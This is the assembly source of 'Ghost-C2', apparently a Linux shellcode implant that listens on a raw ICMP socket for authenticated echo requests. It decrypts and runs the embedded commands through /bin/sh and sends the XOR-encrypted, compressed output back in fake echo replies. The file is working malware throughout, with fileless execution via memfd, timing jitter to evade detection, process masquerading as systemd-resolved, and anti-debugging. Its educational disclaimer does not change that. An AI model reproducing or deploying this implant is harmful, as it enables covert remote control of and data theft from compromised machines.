DEFAULT REL
BITS 64
; ===================================================================================
;  ________  ___  ___  ________  ________  _________        ________  ________     
; |\   ____\|\  \|\  \|\   __  \|\   ____\|\___   ___\     |\   ____\|\_____  \    
; \ \  \___| \ \  \\\  \ \  \|\  \ \  \___|\|___ \  \_|     \ \  \___|\|____|\  \   
;  \ \  \  __ \ \   __  \ \  \\\  \ \_____  \   \ \  \       \ \  \     ____\_\  \  
;   \ \  \|\  \ \  \ \  \ \  \\\  \|____|\  \   \ \  \       \ \  \___|\____ \  \ 
;    \ \_______\ \__\ \__\ \_______\____\_\  \   \ \__\       \ \______\\_________\
;     \|_______|\|__|\|__|\|_______|\_________\   \|__|        \|______\|_________|
;                                   \|_________|                                   
; ===================================================================================
; Project      : Ghost-C2 (v3.6) - "The Invisible ICMP Phantom (PIC Edition)"
; Author       : JM00NJ (https://github.com/JM00NJ) / https://netacoding.com/
; Architecture : x86_64 Linux (Pure Assembly, Libc-free, 100% PIC)
; -----------------------------------------------------------------------------------
; Features:
;   - Architecture: Fully Position Independent Code (RIP-Relative) for memory injection.
;   - Transport   : ICMP Stealth Channel (Asymmetric ID+SEQ Auth: 45k/55k Sum)
;   - Execution   : Fileless Execution via memfd_create (Runtime argv building)
;   - Security    : Rolling XOR Encryption & Safe Stack Mapping (Buffer Isolation)
;   - Evasion     : Adaptive Jitter (Nanosleep) and RDTSC Timestamp Mimicry.
;	- Compression : dpcm-rle-hybrid-x64-compressor / https://github.com/JM00NJ/Vesqer-Baremetal-Compressor-DPCM-RLE-Hybrid-Engine
; -----------------------------------------------------------------------------------
; Disclaimer: This tool is developed for educational and authorized penetration 
; testing purposes only. The author is not responsible for any misuse.
; -----------------------------------------------------------------------------------
; Build (Raw Binary) : nasm -f bin sniff_pic.asm -o shellcode.bin
; Build (Hex Format) : hexdump -v -e '"\\x" 1/1 "%02x"' shellcode.bin
;                 OR : xxd -i shellcode.bin
;
; Note: The pre-compiled shellcode is already embedded inside the Phantom Loader. 
; You only need to run these build commands if you modify this PIC agent's source.
; ===================================================================================

section .text

global _start



; --- ENTRY POINT & DAEMONIZATION ---

_start:

    ;call _htop_masquerade
    ;call _disable_memory_dump
	;call _anti_debugging
    ;mov rax,[fake_name]
    ;mov rdi,[rsp+8]
    ;mov [rdi],rax
    ;mov rax,[fake_name_1]
    ;mov [rdi+8],rax
    ;xor rax, rax              ; rax'i tamamen sıfırla
    ;mov [rdi + 16], rax       ; 16. bayttan itibaren 8 baytı (16-24) komple NULL yap!
    ; Step 1: Fork to background
    mov rax, 57                 ; sys_fork
    syscall
    cmp rax, 0                  
    jne _hang_host                   ; Parent exits

    sub rsp, 0x600000 ; FOR LOADER ! HOLLOW INJECTION UPDATE

    and rsp, -16

    mov rbp, rsp ; anchor
    ; Stack'te kendimize güvenli R-W alanlar belirliyoruz:
    ; icmp_packet kopyası -> [rsp + 0x1000]
    ; delay_req kopyası   -> [rsp + 0x1100]
    ; argv_array kopyası  -> [rsp + 0x1200]
    ; icmp_packet'i Stack'e taşı
    lea rsi, [rel icmp_packet]  ; .data'daki orijinal şablon (Sadece okunur, sorun yok)
    lea rdi, [rbp + 0x100]     ; Stack'teki yeni yerimiz (Okunur ve Yazılır!)
    mov rcx, 88                 ; Paketin boyutu
    rep movsb
    ; delay_req'i Stack'e taşı
    lea rsi, [rel delay_req]
    lea rdi, [rbp + 0x1100]
    mov rcx, 32                 ; 4 adet 8 baytlık qword (req ve rem)
    rep movsb
    ; Step 2: Create a new session
    mov rax, 112                ; sys_setsid
    syscall
    ; Step 3: Create Raw ICMP Socket
    mov rax, 40
    add rax, 1                 ; sys_socket
    mov rdi, 2                  ; AF_INET
    mov rsi, 3                  ; SOCK_RAW
    mov rdx, 1                  ; IPPROTO_ICMP
    syscall                     
    mov [rbp + 0x10], eax            
_sniff:
    ; Initialize sockaddr parameters for recvfrom
    mov dword [rbp + 0x14], 16           
    xor r10, r10                
    ; Clear receive buffer (Zero-out)
    lea rdi, [rbp + 0x2000]    
    xor al, al                  
    mov rcx, 1200               
    rep stosb                   
    ; Listen for ICMP Packets
    mov rax, 45                 ; sys_recvfrom
    mov edi, dword [rbp + 0x10]           
    lea rsi, [rbp + 0x2000]      
    mov rdx, 1200
    xor r10, r10
    lea r8, [rbp + 0x20]        
    lea r9, [rbp + 0x14]              
    syscall
    ; Filter for ICMP Echo Requests (Type 8)
    cmp byte [rbp + 0x2000 + 20], 8 
    jne _sniff                      
    ; Error handling
    cmp rax, 0                  
    jl _error                   
    je _exit                    
    ; --- [MIMICRY UPDATE] SIZE VALIDATION ---
    ; Expected: IP(20) + ICMP(8) + Mimicry(24) = 52 Bytes
    cmp rax, 52                 
    jb _sniff                   
    push rax
    push rdx
; --- MAGIC SEQUENCE VERIFICATION (MASTER KEY) ---
    movzx eax, word [rbp + 0x2000 + 26] ; Extract Sequence
    xchg al, ah                         ; Endianness correction
    movzx edx, word [rbp + 0x2000 + 24] ; Extract Identifier
    xchg dl, dh                         ; Endianness correction
    add eax, edx                        ; EAX = SEQ + ID
    cmp eax, 45000                        ; Verify Master's key total (45000)
    pop rdx                             ; Restore saved RDX
    pop rax                             ; Restore saved RAX (Packet size)
    jne _sniff                          ; Ignore packet if validation fails                    
    ; --- [MIMICRY UPDATE] DECRYPTION & OFFSET HANDLING ---
    mov r14, rax
    sub r14, 52                     ; Strip IP, ICMP Header and Mimicry Padding
    lea rsi, [rbp + 0x2000 + 52]    ; Start reading from offset 52 (Secret data)
    mov rcx, r14
    call _xor_cipher                ; Decrypt the command string
    mov [rbp + 0x1200 + 16], rsi      ; Inject decrypted command into argv_array
    mov rdx, r14                     
    push rdx                        ; Save length for write syscall
    push rsi                        ; Save address for logging
    ; --- IP ADDRESS TO STRING CONVERSION ---
    xor rdx, rdx                     
    xor rbx, rbx                     
    mov rcx, 7                       ; IP raw byte offset
    mov rdi, 15                      ; String buffer offset
_loopforip:
    mov bl, 10                       
    movzx ax, [rbp + 0x20 + rcx]  
_divloop:
    div bl                           
    add ah, 48                       ; Convert digit to ASCII
    mov [rbp + 0x40 + rdi], ah          
    dec rdi                          
    xor ah, ah                       
    cmp al, 0                        
    jg _divloop                      
    cmp rcx, 4                       
    je _contiune                     
    mov byte [rbp + 0x40 + rdi], 46     ; Dot (.)
_contiune:
    dec rdi                          
    dec rcx                          
    cmp rcx, 3                       
    jg _loopforip                    
    ; --- LOGGING RECEIVED PACKET ---
    mov rax, 1                       ; sys_write (Source IP)
    mov rdi, 1                       
    mov rdx, 16                      
    lea rsi, [rbp + 0x40]                 
    syscall
    mov rax, 1                       ; sys_write (Space)
    mov rdi, 1                       
    mov rdx, 1                       
    lea rsi, [rel space_char]           
    syscall
    pop rsi                          ; Restore command address
    pop rdx                          ; Restore command length
    mov rax, 1                       ; sys_write (Received Command)
    mov rdi, 1                       
    syscall                          
    mov rax, 1                       ; sys_write (Newline)
    mov rdi, 1                       
    lea rsi, [rel newline]                
    mov rdx, 1                       
    syscall
    jmp _execute_command            
; --- UTILITY: ICMP CHECKSUM CALCULATION ---
_checksum_cal:
    mov word [rbp + 0x100 + 2], 0          
    xor rcx, rcx                    
    xor r13, r13                    
    xor rax, rax                    
    xor r11d, r11d                  
    ; Header(8) + Mimicry(24) = 32 Base Bytes
    mov rcx, 32                     
    add rcx, r12                    ; Add dynamic payload length
    mov r13, 0                      
    xor rbx, rbx                    
.checksum_loop:
    movzx r11d, word [rbp + 0x100 + r13] 
    add eax, r11d                   
    add r13, 2                      
    sub rcx, 2                      
    cmp rcx, 2                      
    jge .checksum_loop              
    cmp rcx, 1                      
    je .final                       
    jmp .wrap                       
.final:
movzx r11d, word [rbp + 0x100 + r13] 
    add eax, r11d                  
.wrap:
    mov ebx, eax                    
    shr ebx, 16                     ; Carry management
    and eax, 0xFFFF                
    add ax, bx                     
    adc ax, 0                      
    not ax                         ; One's complement
    mov word[rbp + 0x100 + 2], ax              
    ret
_wait_for_child:
    mov rax, 61                     ; sys_wait4
    mov rsi, 0                      
    mov rdx, 0                      
    mov r10, 0                      
    syscall
    ret
_error:
    mov rax, 60                     ; sys_exit
    mov rdi, 1                      
    syscall
; --- CORE EXECUTION LOGIC ---
_execute_command:
    call _memfd_create              ; Create anonymous RAM file for output capture
    push rax                        ; Save memfd FD
	push rbx
    mov rax, 50
    add rax, 7                     ; sys_fork
    syscall
    cmp rax, 0               
    je _execve                      ; Child process handles execution
    mov rdi, rax            
    call _wait_for_child            ; Parent waits for command to complete
	pop rbx
    pop rdi                         ; Retrieve memfd FD
    call _lseek                     ; Reset file pointer to offset 0
    ; READ LOOP: Capture command output from memfd
    xor r14, r14                    ; Reset bytes read counter
_read_loop:
    mov rax, 0                      ; sys_read
    lea rsi, [rbp + 0x4000 + r14]  
    mov rdx, 1000                   ; Read in 1000-byte chunks
    syscall
    test rax, rax                   ; EOF or no data
    jz _read_done                   
    add r14, rax                    ; Update total count
    cmp r14, 5242880                  ; Check buffer limit
    jl _read_loop                   
_read_done:
    ; --- ENCRYPTION PHASE ---
    ;lea rsi, [full_response]
    ;mov rcx, r14                    
    ;call _xor_cipher                
    mov rax, 3                      ; sys_close (Close memfd)
    syscall
    ; --- COMPRESSION CALL ---
    lea rsi, [rbp + 0x4000]     ; SOURCE: Raw output
    lea rdi, [rbp + 0x100000]   ; DEST: Compressed buffer
    mov rcx, r14                ; RCX = Ham Boyut
    call _vesqer_compress       ; Fonksiyon call
    mov r14, rax                ; YENİ BOYUTU R14'e GÜNCELLE
    mov r15, 0                      ; Reset chunk offset
    jmp _chunk_loop                 ; Proceed to packet fragmentation
_chunk_loop:
    cmp r14, 0
    jle .check_last_chunk           
    ; FRAGMENTATION: Split output into 56-byte chunks
    cmp r14, 56           
    jg .set_max_chunk               
    mov r12, r14            
    jmp .copy_data
.set_max_chunk:
    mov r12, 56
.copy_data:
    cld
    lea rdi, [rbp + 0x100 + 32]     ; Write data after 8 (Header) + 24 (Mimicry)
    xor al, al                      
    mov rcx, 56                   
    rep stosb                       
    ; Update dynamic timestamp for stealth
    rdtsc                           
    mov [rbp + 0x100 + 8], rax      
    call _create_seq_id
    lea rsi, [rbp + 0x100000 + r15]
    lea rdi, [rbp + 0x100 + 32]     ; Copy actual encrypted chunk
    mov rcx, r12
    rep movsb                       
    lea rsi, [rbp + 0x100 + 32]
    mov rcx, r12
    call _xor_cipher
.packet_send:
    call _checksum_cal
    mov rax, 44                     ; sys_sendto
    mov edi, dword [rbp + 0x10]              
    lea rsi, [rbp + 0x100]          
    lea rdx, [r12 + 32]             ; Packet size: Header(8) + Mimicry(24) + Payload(r12)
    mov r10, 0               
    lea r8, [rbp + 0x20]         
    mov r9, 16               
    syscall
    ; --- JITTER MECHANISM ---
    push rax                
    push rcx                
    push r11                
    push rdx                
rdtsc
    xor rdx, rdx
    mov ecx, 900000000
    div ecx                  ; RDX = 0 ile 900ms arası rastgele bir değer olur
    add edx, 100000000       ; En az 100ms ekle
    mov qword [rbp + 0x200], 0      ; tv_sec = 0 (Saniye kısmını sıfırla!)
    mov qword [rbp + 0x208], rdx    ; tv_nsec = Rastgele nanosaniye
    mov rax, 35                     ; sys_nanosleep
    lea rdi, [rbp + 0x200]            
    lea rsi, [rbp + 0x200 +16]           
    syscall
    pop rdx
    pop r11                 
    pop rcx
    pop rax
    ;-----------------------
    sub r14, r12                    ; Decrease remaining bytes
    add r15, r12                    ; Advance read offset
    jmp _chunk_loop                 
.check_last_chunk:
    ; Check if an EOF packet is needed
    cmp r12,56                    
    jne _sniff                      
    ; Send 1-byte EOF packet
    mov r12, 1                      
    xor r14, r14                    
    cld
    lea rdi, [rbp + 0x100 + 32]
    xor al, al
    mov rcx, 56
    rep stosb                       
    rdtsc
    mov [rbp + 0x100 + 8], rax
    call _create_seq_id
    mov rax, 44
    mov rdi, [rbp + 0x10]
    lea rsi, [rbp + 0x100]
    mov rdx, 33                     ; Header(8) + Mimicry(24) + EOF(1)
    lea r8, [rbp + 0x20]
    mov r9, 16
    syscall
    jmp _sniff                      
_execve:
    ; Redirection: Bind stdout/stderr to memfd
    pop rbx
    pop rdi                         ; Retrieve memfd FD from stack
    call _dup2                      
	lea rax, [rel str_sh]
	mov [rbp + 0x1200], rax ; rbp+1200 -> "/bin/sh"
	lea rax, [rel str_flag]
	mov [rbp + 0x1208], rax ; rbp+1208 -> "-c"
	lea rax, [rbp + 0x2000 + 52]
	mov [rbp + 0x1210], rax
	xor rax, rax
	mov [rbp + 0x1218], rax
    ; Execute shell command
    mov rax, 50
    add rax, 9                     ; sys_execve
    lea rdi, [rel str_sh]                
    lea rsi, [rbp + 0x1200]            
    xor rdx, rdx                      
    syscall
_dup2:
    mov rax, 33                     ; sys_dup2 (STDOUT)
    mov rsi, 1                      
    syscall
    mov rax, 33                     ; sys_dup2 (STDERR)
    mov rsi, 2                      
    syscall
    ret
_lseek:
    mov rax, 8                      ; sys_lseek
    mov rsi, 0                      
    mov rdx, 0                      
    syscall
    ret
_memfd_create:
	mov rax, 300
    add rax, 19                    ; sys_memfd_create
    lea rdi, [rel dir]                    
    mov rsi, 0                      
    syscall
    ret
_xor_cipher:
    test rcx, rcx                   
    jz .done                        
    push rsi                        
    push rdx                        ; DL kullanacağımız için RDX'i koruyalım
    mov dl, 0x42                    ; Başlangıç anahtarı (Seed)
.loop:
    xor byte [rsi], dl              ; Baytı mevcut anahtarla XOR'la
    add dl, 0x07                    ; Her adımda anahtarı 7 artır (Rolling etkisi)
    inc rsi                         
    loop .loop                      
    pop rdx                         
    pop rsi                         
.done:
    ret
_create_seq_id:
    ; 1. Generate a random number (1-119) for the Identifier
    rdtsc
    xor edx, edx    ; Clear EDX before division
    mov ecx, 20000
    div ecx         ; EDX now contains the remainder (0-118)
    add edx,10000         ; EDX is now a random number between 10000 and 29999 (ID)
    ; 2. Calculate the Sequence number for Asymmetric Return
    mov eax, 55000    ; Load the asymmetric return key (55000) into EAX
    sub eax, edx    ; EAX = 150 - EDX (This becomes the SEQ value)
    ; 3. Network Byte Order (Endianness) Correction
    xchg dl, dh     ; Swap lower 16 bits of EDX (DX)
    xchg al, ah     ; Swap lower 16 bits of EAX (AX)
    ; 4. Inject into the ICMP packet structure
    mov word [rbp + 0x100 + 4], dx
    mov word [rbp + 0x100 + 6], ax
    ret             ; Return to caller
_htop_masquerade:
    mov rax,157
    mov rdi,15
    lea rsi, [fake_name]
    syscall
    ret
_disable_memory_dump:
    mov rax,157
    mov rdi,4
    mov rsi, 0
    syscall
    ret
_anti_debugging:
	mov rax, 91
	add rax, 10 ; sys_ptrace
	xor rdi,rdi ; PTRACE_TRACEME (0)
	xor rsi,rsi
	xor rdx,rdx
	xor r10,r10
	syscall
	test rax,rax
	js _exit
	ret



_vesqer_compress:
    push rbx
    push rsi
    push rdi
    push r8
    push r9
    push r11
    
    mov r11, rdi                ; Start pointer for size calc
    test rcx, rcx
    jz .comp_done
    mov r8b, 1                  ; RLE count
    xor r9b, r9b                ; Active Delta
    ; Anchor
    mov al, byte [rsi]
    inc rsi
    mov byte [rdi], al
    inc rdi
    mov bl, al
    dec rcx
    jz .comp_final
    
    mov al, byte [rsi]
    mov dl, al
    sub al, bl
    mov r9b, al
    
    mov bl, dl
    
    inc rsi
    dec rcx
    
.comp_loop:
    test rcx, rcx
    jz .comp_final
    mov al, byte [rsi]
    mov dl, al
    sub al, bl
    cmp al, r9b
    jne .comp_flush
.comp_inc:
    inc r8b
    inc rsi
    dec rcx
    jz .comp_final
    mov bl, dl
    cmp r8b, 255
    jne .comp_loop
.comp_flush_255:
    mov byte [rdi], r8b      ; 255'i yaz
    inc rdi
    mov byte [rdi], r9b      ; Mevcut deltayı yaz
    inc rdi
    
    ; --- [YENİ: SIFIRLAMA MANTIĞI] ---
    mov r8b, 0               ; Sayacı sıfırla (Bir sonraki lodsb 1 yapacak)
    ; Anchor (bl) zaten rsi'daki karakterle aynı, dokunma!
    jmp .comp_loop           ; Hiçbir şeyi atlamadan döngüye dön
.comp_flush:
    mov byte [rdi], r8b
    inc rdi
    mov byte [rdi], r9b
    inc rdi
    mov r9b, al
    mov r8b, 1
    mov bl, dl
    inc rsi
    dec rcx
    jz .comp_final
    jmp .comp_loop
.comp_final:
    mov byte [rdi], r8b
    inc rdi
    mov byte [rdi], r9b
    inc rdi
.comp_done:
    mov rax, rdi
    sub rax, r11                ; RAX = NEW COMPRESSED LENGTH
    pop r11
    pop r9
    pop r8
    pop rdi
    pop rsi
    pop rbx
    ret
_exit:
    mov rax, 60                     ; sys_exit
    mov rdi, 0                      
    syscall
_hang_host:
    mov rax, 34         ; sys_pause (Sonsuza kadar bekler)
    syscall
    jmp _hang_host      ; Uyanırsa tekrar uyut
; =================================================================

; 🚩 GHOST-C2 VERİ DEPOSU (KODUNUN PARÇASI)

; =================================================================



fake_name    db "systemd-"

fake_name_1  db "resolved", 0



delay_req:

        dq 0                ; Seconds (tv_sec)
        dq 600000000        ; Nano seconds (tv_nsec) - Base 600ms / set to 600 ms or 900 ms at least

delay_rem:

        dq 0                ; Remaining time if interrupted
        dq 0

dir db '[shm]', 0   ; B memfd ismi



    ; --- [MIMICRY UPDATE] UPDATED PACKET ARCHITECTURE ---

icmp_packet:

    type db 0               ; ICMP Type 0 (Echo Reply)
    code db 0               
    checksum dw 0           ; Checksum placeholder

    identifier dw 0    ; Packet Identifier
    sequence dw 0  ; Magic Sequence for filtering
    ; --- MIMICRY PADDING (24 BYTES) ---
    mimicry_ts dq 0         ; 8-byte Dynamic Timestamp (RDTSC)
    mimicry_seq db 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17
                db 0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F
        ; -------------------------------------
payload times 56 db 0 ; Command output payload (56 bytes chunk)
    payload_len equ $ - payload
newline      db 10
space_char   db 32
forip db 4                  ; Legacy variable
str_sh db '/bin/sh', 0      ; Path to shell
str_flag db '-c', 0         ; Command flag
